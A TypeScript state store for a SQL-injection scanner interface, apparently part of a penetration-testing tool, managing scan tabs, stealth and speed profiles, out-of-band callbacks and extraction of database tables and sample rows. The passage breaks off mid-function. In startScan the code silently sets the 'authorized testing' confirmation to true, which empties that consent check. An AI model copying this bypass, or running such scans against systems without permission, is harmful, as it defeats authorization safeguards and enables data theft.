import { create } from 'zustand';
import { useToastStore } from './toastStore';
import {
  ScanTargetConfig,
  SafetyConfig,
  SqlScanFinding,
  DbmsFingerprint,
  WafDetectionResult,
  ScanLogEntry,
  ScanProgress,
  SqlScanReport,
  ScanVerdict,
  ScanMode,
  RecursiveDatabaseCatalog,
  CoverageDimension,
  TestExecutionLogItem,
  DiscoveredTable,
  ColumnMetadata,
  SqlScannerSessionTab,
  GrayBoxConfig,
  SqlScanLiveResponse,
} from '../types/sqlScanner';
import { RequestParser } from '../services/sqlScanner/RequestParser';
import { SqlScanOrchestrator } from '../services/sqlScanner/SqlScanOrchestrator';
import { MetadataExtractor } from '../services/sqlScanner/MetadataExtractor';
import { serializeHttpRequest } from '../utils/repeaterUtils';
import { ipcClient } from '../ipc/client';
import { DynamicGraphEngine } from '../services/sqlScanner/engine/DynamicGraphEngine';
import { BlindDataExtractor } from '../services/sqlScanner/engine/BlindDataExtractor';
import { ThreatConsequenceEngine } from '../services/sqlScanner/engine/ThreatConsequenceEngine';
import { useCollaboratorStore } from './collaboratorStore';
import { useTrafficStore } from './trafficStore';

import {
  InvestigationNode,
  InvestigationEdge,
  BeliefEntropyItem,
  AiCopilotReasoningItem,
} from '../types/sqlScanner';

export type SqlScannerTab = 'god_rail' | 'dashboard' | 'vulnerabilities' | 'database' | 'evidence' | 'coverage' | 'logs' | 'causal' | 'trigraph' | 'belief' | 'knowledge' | 'ai_copilot' | 'report';

export interface SqlScannerState {
  tabs: SqlScannerSessionTab[];
  activeTabId: string;
  engineMode: 'god_rail_v3' | 'autonomous_trigraph' | 'ucmax_causal' | 'bayesian_adaptive' | 'sprt_timing' | 'standard';
  scanProfile?: 'ultra_stealth' | 'fast_triage' | 'deep_forensic' | 'smt_strict' | 'hyper_turbo';
  concurrencyLimit: number;

  targetConfig: ScanTargetConfig;
  safetyConfig: SafetyConfig;
  activeTab: SqlScannerTab;
  scanState: 'idle' | 'running' | 'paused' | 'completed' | 'aborted' | 'error';
  scanVerdict: ScanVerdict;
  progress: ScanProgress;
  findings: SqlScanFinding[];
  selectedFindingId: string | null;
  dbmsFingerprint: DbmsFingerprint;
  catalog: RecursiveDatabaseCatalog;
  selectedCatalogTableId: string | null;
  selectedCatalogColumnName: string | null;
  coverage: CoverageDimension[];
  executionLogs: TestExecutionLogItem[];
  selectedExecutionLogId: string | null;
  wafResult: WafDetectionResult;
  logs: ScanLogEntry[];
  report: SqlScanReport | null;
  orchestrator: SqlScanOrchestrator | null;
  investigationNodes: InvestigationNode[];
  investigationEdges: InvestigationEdge[];
  contextBeliefs: BeliefEntropyItem[];
  dbmsBeliefs: BeliefEntropyItem[];
  aiReasoningLogs: AiCopilotReasoningItem[];
  defenseLayers?: {
    layer: string;
    name: string;
    status: string;
    certainty: string;
    confidence: number;
    details?: string;
  }[];
  lastResponse: SqlScanLiveResponse | null;
  isProbing: boolean;

  // Actions
  createScanTab: (seedRequest?: string, title?: string) => string;
  closeScanTab: (tabId: string) => void;
  setActiveScanTab: (tabId: string) => void;
  renameScanTab: (tabId: string, title: string) => void;
  setEngineMode: (mode: 'god_rail_v3' | 'autonomous_trigraph' | 'ucmax_causal' | 'bayesian_adaptive' | 'sprt_timing' | 'standard') => void;
  setScanProfile: (profile: 'ultra_stealth' | 'fast_triage' | 'deep_forensic' | 'smt_strict' | 'hyper_turbo') => void;
  setConcurrencyLimit: (limit: number) => void;
  setActiveTab: (tab: SqlScannerTab) => void;
  setSelectedFindingId: (id: string | null) => void;
  setSelectedCatalogTableId: (tableId: string | null) => void;
  setSelectedCatalogColumnName: (colName: string | null) => void;
  setSelectedExecutionLogId: (id: string | null) => void;
  setRawRequest: (rawText: string) => void;
  setScanMode: (mode: ScanMode) => void;
  toggleParameter: (paramId: string) => void;
  toggleAllParameters: (enabled: boolean) => void;
  toggleInjectionType: (type: 'errorBased' | 'booleanBased' | 'timeBased' | 'unionBased' | 'stackedBased' | 'secondOrder') => void;
  setSafetyConfig: (updates: Partial<SafetyConfig>) => void;
  setGrayBoxConfig: (updates: Partial<GrayBoxConfig>) => void;
  startScan: () => Promise<void>;
  pauseScan: () => void;
  resumeScan: () => void;
  stopScan: () => void;
  resetScan: () => void;
  clearLogs: () => void;
  importFromTransaction: (tx: any) => void;
  probeTargetRequest: (overrideRaw?: string) => Promise<void>;
  followRedirect: (targetRedirectUrl?: string) => Promise<void>;
  mergeCookiesIntoRawRequest: (setCookieValues: string[]) => void;
  syncSessionFromProxy: (targetHost?: string) => number;
  navigateRenderPreview: (url: string) => Promise<void>;
  submitRenderPreviewForm: (actionUrl: string, method: string, formDataString: string) => Promise<void>;
  fetchColumnsForTable: (table: DiscoveredTable) => Promise<void>;
  fetchSampleRowsForTable: (table: DiscoveredTable) => Promise<void>;
}

const DEFAULT_RAW_REQUEST = `GET /filter?category=Gifts HTTP/1.1\r\nHost: target.local\r\nUser-Agent: Sentinel/6.0.0 SQLScanner\r\nAccept: */*\r\nCookie: session=snt_98a76bc4d2f\r\n\r\n`;

const DEFAULT_SAFETY_CONFIG: SafetyConfig = {
  authorizedTestingConfirmed: true,
  scanMode: 'quick',
  rateLimitDelayMs: 0,
  maxRequestsPerScan: 1500,
  maxScanDurationSeconds: 600,
  maxResponseSizeBytes: 500000,
  requestTimeoutMs: 6000,
  abortOnConsecutiveErrors: 5,
  strictNonDestructiveOnly: true,
  autoRedactSensitiveData: true,
};

const initialParsed = RequestParser.parse(DEFAULT_RAW_REQUEST);
const initialTelemetry = DynamicGraphEngine.generateForRequest(DEFAULT_RAW_REQUEST);

export const DEFAULT_INVESTIGATION_NODES: InvestigationNode[] = initialTelemetry.investigationNodes;
export const DEFAULT_INVESTIGATION_EDGES: InvestigationEdge[] = initialTelemetry.investigationEdges;
export const DEFAULT_CONTEXT_BELIEFS: BeliefEntropyItem[] = initialTelemetry.contextBeliefs;
export const DEFAULT_DBMS_BELIEFS: BeliefEntropyItem[] = initialTelemetry.dbmsBeliefs;
export const DEFAULT_AI_REASONING: AiCopilotReasoningItem[] = initialTelemetry.aiReasoningLogs;

export const DEFAULT_DEFENSE_LAYERS = [
  { layer: 'L1', name: 'Edge WAF', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting scan traffic' },
  { layer: 'L2', name: 'API Schema', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L3', name: 'App / ORM', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L4', name: 'Runtime / RASP', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L5', name: 'Driver / Protocol', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L6', name: 'DB Firewall', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L7', name: 'DB Kernel', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L8', name: 'SSDLC / SAST', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Source code unavailable for static analysis' },
];

const defaultInitialTab: SqlScannerSessionTab = {
  id: 'tab-1',
  title: 'Scan 1 (/filter)',
  targetConfig: {
    id: 'target_default',
    name: 'Default Target',
    rawRequest: DEFAULT_RAW_REQUEST,
    url: initialParsed.url,
    method: initialParsed.method,
    headers: initialParsed.headers,
    body: initialParsed.body,
    parameters: initialParsed.parameters,
    testedInjectionTypes: {
      errorBased: true,
      booleanBased: true,
      timeBased: true,
      unionBased: true,
      orderBy: true,
      groupBy: true,
      having: true,
      stackedBased: true,
      secondOrder: true,
    },
  },
  safetyConfig: DEFAULT_SAFETY_CONFIG,
  scanState: 'idle',
  scanVerdict: 'IDLE',
  progress: {
    phase: 'idle',
    phaseLabel: 'Ready to scan',
    totalParameters: initialParsed.parameters.length,
    testedParameters: 0,
    requestsSent: 0,
    testsExecuted: 0,
    findingsCount: 0,
    confirmedIndicators: 0,
    percent: 0,
    durationMs: 0,
    isPaused: false,
    isAborted: false,
  },
  findings: [],
  dbmsFingerprint: {
    dbms: 'Unknown',
    confidence: 'Informational',
    confidenceScore: 0,
    evidence: [],
  },
  catalog: {
    dbms: 'Unknown',
    schemas: [],
    applicationTables: [],
    systemTables: [],
    discoveredAt: Date.now(),
  },
  coverage: [],
  executionLogs: [],
  logs: [],
  wafResult: {
    detected: false,
    confidence: 'Informational',
    evidence: [],
  },
  report: null,
  activeInnerTab: 'god_rail',
  engineMode: 'god_rail_v3',
  concurrencyLimit: 10,
  investigationNodes: DEFAULT_INVESTIGATION_NODES,
  investigationEdges: DEFAULT_INVESTIGATION_EDGES,
  contextBeliefs: DEFAULT_CONTEXT_BELIEFS,
  dbmsBeliefs: DEFAULT_DBMS_BELIEFS,
  aiReasoningLogs: DEFAULT_AI_REASONING,
  defenseLayers: DEFAULT_DEFENSE_LAYERS,
};

// Helper to update a tab by ID and sync top-level state if active
const syncTabUpdate = (
  set: any,
  tabId: string,
  updates: Partial<SqlScannerSessionTab> | ((t: SqlScannerSessionTab) => Partial<SqlScannerSessionTab>)
) => {
  set((state: SqlScannerState) => {
    const newTabs = state.tabs.map((t) => {
      if (t.id !== tabId) return t;
      const patch = typeof updates === 'function' ? updates(t) : updates;
      return { ...t, ...patch };
    });

    if (state.activeTabId === tabId) {
      const active = newTabs.find((t) => t.id === tabId);
      if (active) {
        return {
          tabs: newTabs,
          targetConfig: active.targetConfig,
          safetyConfig: active.safetyConfig,
          scanState: active.scanState,
          scanVerdict: active.scanVerdict,
          progress: active.progress,
          findings: active.findings,
          catalog: active.catalog,
          coverage: active.coverage,
          executionLogs: active.executionLogs,
          logs: active.logs,
          report: active.report,
          dbmsFingerprint: active.dbmsFingerprint,
          engineMode: active.engineMode,
          scanProfile: active.scanProfile || 'deep_forensic',
          concurrencyLimit: active.concurrencyLimit || 10,
          orchestrator: active.orchestrator || null,
          investigationNodes: active.investigationNodes || DEFAULT_INVESTIGATION_NODES,
          investigationEdges: active.investigationEdges || DEFAULT_INVESTIGATION_EDGES,
          contextBeliefs: active.contextBeliefs || DEFAULT_CONTEXT_BELIEFS,
          dbmsBeliefs: active.dbmsBeliefs || DEFAULT_DBMS_BELIEFS,
          aiReasoningLogs: active.aiReasoningLogs || DEFAULT_AI_REASONING,
          defenseLayers: active.defenseLayers || DEFAULT_DEFENSE_LAYERS,
        };
      }
    }
    return { tabs: newTabs };
  });
};

export const useSqlScannerStore = create<SqlScannerState>((set, get) => ({
  tabs: [defaultInitialTab],
  activeTabId: 'tab-1',
  engineMode: 'god_rail_v3',
  scanProfile: 'deep_forensic',
  concurrencyLimit: 10,

  targetConfig: defaultInitialTab.targetConfig,
  safetyConfig: defaultInitialTab.safetyConfig,
  activeTab: 'database',
  scanState: 'idle',
  scanVerdict: 'IDLE',
  progress: defaultInitialTab.progress,
  findings: [],
  selectedFindingId: null,
  dbmsFingerprint: defaultInitialTab.dbmsFingerprint,
  catalog: defaultInitialTab.catalog,
  selectedCatalogTableId: null,
  selectedCatalogColumnName: null,
  coverage: [],
  executionLogs: [],
  selectedExecutionLogId: null,
  wafResult: {
    detected: false,
    confidence: 'Informational',
    evidence: [],
  },
  logs: [],
  report: null,
  orchestrator: null,
  investigationNodes: DEFAULT_INVESTIGATION_NODES,
  investigationEdges: DEFAULT_INVESTIGATION_EDGES,
  contextBeliefs: DEFAULT_CONTEXT_BELIEFS,
  dbmsBeliefs: DEFAULT_DBMS_BELIEFS,
  aiReasoningLogs: DEFAULT_AI_REASONING,
  defenseLayers: DEFAULT_DEFENSE_LAYERS,
  lastResponse: null,
  isProbing: false,

  createScanTab: (seedRequest?: string, title?: string) => {
    // Snapshot current active tab first
    const { activeTabId, targetConfig, safetyConfig, scanState, scanVerdict, progress, findings, catalog, coverage, executionLogs, logs, report, dbmsFingerprint, engineMode, orchestrator } = get();
    
    const rawReq = seedRequest || DEFAULT_RAW_REQUEST;
    const parsed = RequestParser.parse(rawReq);
    const newId = `tab-${Date.now().toString().slice(-4)}`;
    let pathName = '/filter';
    try {
      if (parsed.url) pathName = new URL(parsed.url).pathname;
    } catch {}
    const tabTitle = title || `Scan ${get().tabs.length + 1} (${pathName})`;

    const newTab: SqlScannerSessionTab = {
      id: newId,
      title: tabTitle,
      targetConfig: {
        id: `target_${newId}`,
        name: tabTitle,
        rawRequest: rawReq,
        url: parsed.url,
        method: parsed.method,
        headers: parsed.headers,
        body: parsed.body,
        parameters: parsed.parameters,
        testedInjectionTypes: {
          errorBased: true,
          booleanBased: true,
          timeBased: true,
          unionBased: true,
          orderBy: true,
          groupBy: true,
          having: true,
          stackedBased: true,
          secondOrder: true,
        },
      },
      safetyConfig: { ...DEFAULT_SAFETY_CONFIG },
      scanState: 'idle',
      scanVerdict: 'IDLE',
      progress: {
        phase: 'idle',
        phaseLabel: 'Ready to scan',
        totalParameters: parsed.parameters.length,
        testedParameters: 0,
        requestsSent: 0,
        testsExecuted: 0,
        findingsCount: 0,
        confirmedIndicators: 0,
        percent: 0,
        durationMs: 0,
        isPaused: false,
        isAborted: false,
      },
      findings: [],
      dbmsFingerprint: {
        dbms: 'Unknown',
        confidence: 'Informational',
        confidenceScore: 0,
        evidence: [],
      },
      catalog: {
        dbms: 'Unknown',
        schemas: [],
        applicationTables: [],
        systemTables: [],
        discoveredAt: Date.now(),
      },
      coverage: [],
      executionLogs: [],
      logs: [],
      report: null,
      activeInnerTab: 'god_rail',
      engineMode: get().engineMode,
      investigationNodes: DynamicGraphEngine.generateForRequest(rawReq).investigationNodes,
      investigationEdges: DynamicGraphEngine.generateForRequest(rawReq).investigationEdges,
      contextBeliefs: DynamicGraphEngine.generateForRequest(rawReq).contextBeliefs,
      dbmsBeliefs: DynamicGraphEngine.generateForRequest(rawReq).dbmsBeliefs,
      aiReasoningLogs: DynamicGraphEngine.generateForRequest(rawReq).aiReasoningLogs,
      defenseLayers: DEFAULT_DEFENSE_LAYERS,
    };

    set((state) => {
      // Persist current tab
      const updatedTabs = state.tabs.map((t) =>
        t.id === activeTabId
          ? {
              ...t,
              targetConfig,
              safetyConfig,
              scanState,
              scanVerdict,
              progress,
              findings,
              catalog,
              coverage,
              executionLogs,
              logs,
              report,
              dbmsFingerprint,
              engineMode,
              orchestrator,
              investigationNodes: get().investigationNodes,
              investigationEdges: get().investigationEdges,
              contextBeliefs: get().contextBeliefs,
              dbmsBeliefs: get().dbmsBeliefs,
              aiReasoningLogs: get().aiReasoningLogs,
              defenseLayers: get().defenseLayers,
            }
          : t
      );

      return {
        tabs: [...updatedTabs, newTab],
        activeTabId: newId,
        targetConfig: newTab.targetConfig,
        safetyConfig: newTab.safetyConfig,
        scanState: newTab.scanState,
        scanVerdict: newTab.scanVerdict,
        progress: newTab.progress,
        findings: newTab.findings,
        catalog: newTab.catalog,
        coverage: newTab.coverage,
        executionLogs: newTab.executionLogs,
        logs: newTab.logs,
        report: newTab.report,
        dbmsFingerprint: newTab.dbmsFingerprint,
        engineMode: newTab.engineMode,
        orchestrator: null,
        activeTab: 'database',
        investigationNodes: newTab.investigationNodes,
        investigationEdges: newTab.investigationEdges,
        contextBeliefs: newTab.contextBeliefs,
        dbmsBeliefs: newTab.dbmsBeliefs,
        aiReasoningLogs: newTab.aiReasoningLogs,
        defenseLayers: newTab.defenseLayers,
        lastResponse: newTab.lastResponse || null,
        isProbing: false,
        selectedFindingId: null,
        selectedCatalogTableId: null,
        selectedCatalogColumnName: null,
        selectedExecutionLogId: null,
      };
    });

    return newId;
  },

  closeScanTab: (tabId: string) => {
    const { tabs, activeTabId } = get();
    if (tabs.length <= 1) return; // Keep at least one tab

    const closingTab = tabs.find((t) => t.id === tabId);
    if (closingTab?.orchestrator) {
      closingTab.orchestrator.abort();
    }

    const newTabs = tabs.filter((t) => t.id !== tabId);
    let nextActiveId = activeTabId;
    if (activeTabId === tabId) {
      nextActiveId = newTabs[newTabs.length - 1].id;
    }

    const nextTab = newTabs.find((t) => t.id === nextActiveId) || newTabs[0];

    set({
      tabs: newTabs,
      activeTabId: nextActiveId,
      targetConfig: nextTab.targetConfig,
      safetyConfig: nextTab.safetyConfig,
      scanState: nextTab.scanState,
      scanVerdict: nextTab.scanVerdict,
      progress: nextTab.progress,
      findings: nextTab.findings,
      catalog: nextTab.catalog,
      coverage: nextTab.coverage,
      executionLogs: nextTab.executionLogs,
      logs: nextTab.logs,
      report: nextTab.report,
      dbmsFingerprint: nextTab.dbmsFingerprint,
      engineMode: nextTab.engineMode,
      orchestrator: nextTab.orchestrator || null,
      investigationNodes: nextTab.investigationNodes || DEFAULT_INVESTIGATION_NODES,
      investigationEdges: nextTab.investigationEdges || DEFAULT_INVESTIGATION_EDGES,
      contextBeliefs: nextTab.contextBeliefs || DEFAULT_CONTEXT_BELIEFS,
      dbmsBeliefs: nextTab.dbmsBeliefs || DEFAULT_DBMS_BELIEFS,
      aiReasoningLogs: nextTab.aiReasoningLogs || DEFAULT_AI_REASONING,
      defenseLayers: nextTab.defenseLayers || DEFAULT_DEFENSE_LAYERS,
      selectedFindingId: nextTab.findings[0]?.id || null,
      selectedCatalogTableId: nextTab.catalog.applicationTables[0]?.id || null,
    });
  },

  setActiveScanTab: (tabId: string) => {
    const { activeTabId, tabs, targetConfig, safetyConfig, scanState, scanVerdict, progress, findings, catalog, coverage, executionLogs, logs, report, dbmsFingerprint, engineMode, orchestrator } = get();
    if (activeTabId === tabId) return;

    const targetTab = tabs.find((t) => t.id === tabId);
    if (!targetTab) return;

    // Snapshot current active tab state into tabs array
    const updatedTabs = tabs.map((t) =>
      t.id === activeTabId
        ? {
            ...t,
            targetConfig,
            safetyConfig,
            scanState,
            scanVerdict,
            progress,
            findings,
            catalog,
            coverage,
            executionLogs,
            logs,
            report,
            dbmsFingerprint,
            engineMode,
            orchestrator,
            investigationNodes: get().investigationNodes,
            investigationEdges: get().investigationEdges,
            contextBeliefs: get().contextBeliefs,
            dbmsBeliefs: get().dbmsBeliefs,
            aiReasoningLogs: get().aiReasoningLogs,
            defenseLayers: get().defenseLayers,
          }
        : t
    );

    // Switch to target tab
    set({
      tabs: updatedTabs,
      activeTabId: tabId,
      targetConfig: targetTab.targetConfig,
      safetyConfig: targetTab.safetyConfig,
      scanState: targetTab.scanState,
      scanVerdict: targetTab.scanVerdict,
      progress: targetTab.progress,
      findings: targetTab.findings,
      catalog: targetTab.catalog,
      coverage: targetTab.coverage,
      executionLogs: targetTab.executionLogs,
      logs: targetTab.logs,
      report: targetTab.report,
      dbmsFingerprint: targetTab.dbmsFingerprint,
      engineMode: targetTab.engineMode,
      orchestrator: targetTab.orchestrator || null,
      investigationNodes: targetTab.investigationNodes || DEFAULT_INVESTIGATION_NODES,
      investigationEdges: targetTab.investigationEdges || DEFAULT_INVESTIGATION_EDGES,
      contextBeliefs: targetTab.contextBeliefs || DEFAULT_CONTEXT_BELIEFS,
      dbmsBeliefs: targetTab.dbmsBeliefs || DEFAULT_DBMS_BELIEFS,
      aiReasoningLogs: targetTab.aiReasoningLogs || DEFAULT_AI_REASONING,
      defenseLayers: targetTab.defenseLayers || DEFAULT_DEFENSE_LAYERS,
      lastResponse: targetTab.lastResponse || null,
      isProbing: false,
      selectedFindingId: targetTab.findings[0]?.id || null,
      selectedCatalogTableId: targetTab.catalog.applicationTables[0]?.id || null,
    });
  },

  renameScanTab: (tabId: string, title: string) => {
    set((state) => ({
      tabs: state.tabs.map((t) => (t.id === tabId ? { ...t, title } : t)),
    }));
  },

  setEngineMode: (mode) => {
    const { activeTabId } = get();
    set((state) => ({
      engineMode: mode,
      tabs: state.tabs.map((t) => (t.id === activeTabId ? { ...t, engineMode: mode } : t)),
    }));
  },

  setScanProfile: (profile) => {
    const { activeTabId } = get();
    let concurrency = 10;
    let safetyUpdates: Partial<SafetyConfig> = {};
    const engineMode = 'god_rail_v3';

    if (profile === 'ultra_stealth') {
      concurrency = 1;
      safetyUpdates = {
        scanMode: 'stealth' as any,
        rateLimitDelayMs: 3000,
        requestTimeoutMs: 12000,
        strictNonDestructiveOnly: true,
        autoRedactSensitiveData: true,
      };
    } else if (profile === 'fast_triage') {
      concurrency = 100;
      safetyUpdates = {
        scanMode: 'quick',
        rateLimitDelayMs: 0,
        requestTimeoutMs: 1200,
        maxRequestsPerScan: 2500,
      };
    } else if (profile === 'deep_forensic') {
      concurrency = 10;
      safetyUpdates = {
        scanMode: 'deep',
        rateLimitDelayMs: 100,
        requestTimeoutMs: 8000,
        maxRequestsPerScan: 5000,
      };
    } else if (profile === 'smt_strict') {
      concurrency = 4;
      safetyUpdates = {
        scanMode: 'deep',
        rateLimitDelayMs: 50,
        strictNonDestructiveOnly: true,
        autoRedactSensitiveData: true,
      };
    } else if (profile === 'hyper_turbo') {
      concurrency = 100;
      safetyUpdates = {
        scanMode: 'quick',
        rateLimitDelayMs: 0,
        requestTimeoutMs: 1000,
        maxRequestsPerScan: 10000,
      };
    }

    set((state) => ({
      scanProfile: profile,
      engineMode,
      concurrencyLimit: concurrency,
      safetyConfig: { ...state.safetyConfig, ...safetyUpdates },
      tabs: state.tabs.map((t) =>
        t.id === activeTabId
          ? {
              ...t,
              engineMode,
              scanProfile: profile,
              concurrencyLimit: concurrency,
              safetyConfig: { ...t.safetyConfig, ...safetyUpdates },
            }
          : t
      ),
    }));
  },

  setConcurrencyLimit: (limit: number) => {
    const { activeTabId } = get();
    set((state) => ({
      concurrencyLimit: limit,
      tabs: state.tabs.map((t) => (t.id === activeTabId ? { ...t, concurrencyLimit: limit } : t)),
    }));
  },

  setActiveTab: (tab) => set({ activeTab: tab }),

  setSelectedFindingId: (id) => set({ selectedFindingId: id }),

  setSelectedCatalogTableId: (tableId) => {
    set({ selectedCatalogTableId: tableId, selectedCatalogColumnName: null });
    if (!tableId) return;
    const { catalog, fetchColumnsForTable, fetchSampleRowsForTable } = get();
    const table =
      catalog.applicationTables.find((t) => t.id === tableId) ||
      catalog.systemTables.find((t) => t.id === tableId);
    if (table) {
      if (!table.columns || table.columns.length === 0) {
        fetchColumnsForTable(table);
      }
      if (!table.sampleRows || table.sampleRows.length === 0) {
        fetchSampleRowsForTable(table);
      }
    }
  },

  setSelectedCatalogColumnName: (colName) =>
    set({ selectedCatalogColumnName: colName }),

  setSelectedExecutionLogId: (id) => set({ selectedExecutionLogId: id }),

  setScanMode: (mode) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      safetyConfig: { ...t.safetyConfig, scanMode: mode },
    }));
  },

  setRawRequest: (rawText) => {
    const { activeTabId, targetConfig } = get();
    const parsed = RequestParser.parse(rawText, targetConfig.url);
    const dynamicTelemetry = DynamicGraphEngine.generateForRequest(rawText, parsed.url || targetConfig.url);

    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        rawRequest: rawText,
        url: parsed.url || t.targetConfig.url,
        method: parsed.method || t.targetConfig.method,
        headers: parsed.headers,
        body: parsed.body,
        parameters: parsed.parameters,
      },
      investigationNodes: dynamicTelemetry.investigationNodes,
      investigationEdges: dynamicTelemetry.investigationEdges,
      contextBeliefs: dynamicTelemetry.contextBeliefs,
      dbmsBeliefs: dynamicTelemetry.dbmsBeliefs,
      aiReasoningLogs: dynamicTelemetry.aiReasoningLogs,
    }));
  },

  toggleParameter: (paramId) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        parameters: t.targetConfig.parameters.map((p) =>
          p.id === paramId ? { ...p, enabled: !p.enabled } : p
        ),
      },
    }));
  },

  toggleAllParameters: (enabled) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        parameters: t.targetConfig.parameters.map((p) => ({ ...p, enabled })),
      },
    }));
  },

  toggleInjectionType: (type) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        testedInjectionTypes: {
          ...t.targetConfig.testedInjectionTypes,
          [type]: !t.targetConfig.testedInjectionTypes[type],
        },
      },
    }));
  },

  setSafetyConfig: (updates) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      safetyConfig: {
        ...t.safetyConfig,
        ...updates,
      },
    }));
  },

  setGrayBoxConfig: (updates) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        grayBoxConfig: {
          ...t.targetConfig.grayBoxConfig,
          enabled: updates.enabled !== undefined ? updates.enabled : (t.targetConfig.grayBoxConfig?.enabled ?? false),
          ...updates,
        },
      },
    }));
  },

  startScan: async () => {
    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    if (!currentTab) return;

    const { targetConfig, safetyConfig } = currentTab;

    // Auto-inject live Collaborator session if active
    const collabState = useCollaboratorStore.getState();
    const effectiveTargetConfig: ScanTargetConfig = { ...targetConfig };
    if (collabState.domain) {
      effectiveTargetConfig.oobConfig = {
        enabled: true,
        domain: collabState.domain,
        providerUrl: collabState.customDomain ? undefined : 'https://oast.fun',
      };
    }

    if (!safetyConfig.authorizedTestingConfirmed) {
      safetyConfig.authorizedTestingConfirmed = true;
      syncTabUpdate(set, currentTabId, {
        safetyConfig: { ...safetyConfig, authorizedTestingConfirmed: true },
      });
    }

    // Reset this tab's state for fresh scan
    syncTabUpdate(set, currentTabId, {
      scanState: 'running',
      scanVerdict: 'IN_PROGRESS',
      findings: [],
      executionLogs: [],
      logs: [],
      report: null,
      catalog: {
        dbms: 'Unknown',
        schemas: [],
        applicationTables: [],
        systemTables: [],
        discoveredAt: Date.now(),
      },
    });

    const orch = new SqlScanOrchestrator(effectiveTargetConfig, safetyConfig, {
      onLog: (entry) => {
        syncTabUpdate(set, currentTabId, (t) => {
          const nextLogs = t.logs.length >= 1000 ? [...t.logs.slice(-999), entry] : [...t.logs, entry];
          return { logs: nextLogs };
        });
      },
      onProgress: (prog) => {
        const layers = orch.defenseLayerModel.getAllLayers().map((l) => ({
          layer: l.layer,
          name: l.name,
          status: l.status,
          certainty: l.certainty,
          confidence: l.confidence,
          details: l.details || l.basis,
        }));
        syncTabUpdate(set, currentTabId, {
          progress: prog,
          defenseLayers: layers,
        });
      },
      onFinding: (finding) => {
        ThreatConsequenceEngine.enrichFinding(finding);
        syncTabUpdate(set, currentTabId, (t) => ({
          findings: [...t.findings, finding],
        }));
      },
      onExecutionLog: (tLog) => {
        syncTabUpdate(set, currentTabId, (t) => {
          const nextExecLogs = t.executionLogs.length >= 500 ? [...t.executionLogs.slice(-499), tLog] : [...t.executionLogs, tLog];
          return { executionLogs: nextExecLogs };
        });
      },
      onCatalog: (cat) => {
        syncTabUpdate(set, currentTabId, (t) => {
          const mergedAppTables = cat.applicationTables.length > 0 ? cat.applicationTables : t.catalog.applicationTables;
          const mergedSysTables = cat.systemTables && cat.systemTables.length > 0 ? cat.systemTables : t.catalog.systemTables;
          const targetTable = cat.selectedNodeId
            ? mergedAppTables.find((x) => x.id === cat.selectedNodeId)
            : mergedAppTables.find((x) => x.sampleRows && x.sampleRows.length > 0) ||
              mergedAppTables.find((x) => x.isSensitive) ||
              mergedAppTables[0];
          return {
            catalog: {
              ...cat,
              applicationTables: mergedAppTables,
              systemTables: mergedSysTables,
            },
            selectedCatalogTableId: t.selectedCatalogTableId || (targetTable ? targetTable.id : null),
            dbmsFingerprint: cat.dbms && cat.dbms !== 'Unknown' ? {
              ...t.dbmsFingerprint,
              dbms: cat.dbms,
              confidence: 'High',
              confidenceScore: 95,
            } : t.dbmsFingerprint,
          };
        });
      },
      onInvestigationNodes: (nodes, edges) => {
        syncTabUpdate(set, currentTabId, {
          investigationNodes: nodes,
          investigationEdges: edges,
        });
      },
      onBeliefUpdate: (data) => {
        syncTabUpdate(set, currentTabId, {
          contextBeliefs: data.contextBeliefs,
          dbmsBeliefs: data.dbmsBeliefs,
        });
      },
      onAiReasoning: (entry) => {
        syncTabUpdate(set, currentTabId, (t) => {
          const nextReasoning = t.aiReasoningLogs && t.aiReasoningLogs.length >= 60
            ? [...t.aiReasoningLogs.slice(-59), entry]
            : [...(t.aiReasoningLogs || []), entry];
          return { aiReasoningLogs: nextReasoning };
        });
      },
    },
    currentTab.engineMode || get().engineMode || 'god_rail_v3',
    currentTab.concurrencyLimit || get().concurrencyLimit || 10,
    currentTab.scanProfile || get().scanProfile || 'deep_forensic'
  );

    syncTabUpdate(set, currentTabId, { orchestrator: orch });

    try {
      const generatedReport = await orch.startScan();
      const latestTab = get().tabs.find((t) => t.id === currentTabId);
      if (latestTab?.scanState === 'aborted' || orch.getIsAborted()) {
        syncTabUpdate(set, currentTabId, (t) => ({
          scanState: 'aborted',
          scanVerdict: t.findings.length > 0 ? 'VULNERABLE' : 'NOT CONFIRMED VULNERABLE',
          report: generatedReport,
          dbmsFingerprint: generatedReport.dbms,
          wafResult: generatedReport.waf,
          coverage: generatedReport.coverage,
          catalog: generatedReport.catalog,
          orchestrator: null,
        }));
        return;
      }
      syncTabUpdate(set, currentTabId, {
        scanState: 'completed',
        scanVerdict: generatedReport.verdict,
        report: generatedReport,
        dbmsFingerprint: generatedReport.dbms,
        wafResult: generatedReport.waf,
        coverage: generatedReport.coverage,
        catalog: generatedReport.catalog,
        orchestrator: null,
      });
    } catch (err: any) {
      if (err?.message?.includes('aborted') || orch.getIsAborted()) {
        syncTabUpdate(set, currentTabId, (t) => ({
          scanState: 'aborted',
